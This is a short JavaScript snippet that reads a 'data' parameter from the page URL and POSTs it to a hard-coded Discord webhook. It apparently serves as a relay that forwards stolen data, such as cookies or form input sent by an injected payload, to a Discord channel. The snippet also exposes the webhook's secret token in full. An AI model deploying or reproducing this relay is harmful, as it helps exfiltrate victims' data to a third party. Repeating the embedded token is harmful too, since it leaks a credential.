const myKeysValues = window.location.search;
console.log(myKeysValues);
const urlParams = new URLSearchParams(myKeysValues);
var msg = "";
msg += urlParams.get("data");
fetch("https://discordapp.com/api/webhooks/1255962432921145457/PLRB-dTHp8mXNBsp5N85oGGr2776pyvESiZpTOe032UtLHtVwgbbO5RDYBzD03io256l" + "?wait=true", {"method":"POST", "headers": {"content-type": "application/json"},"body": JSON.stringify(msg)});
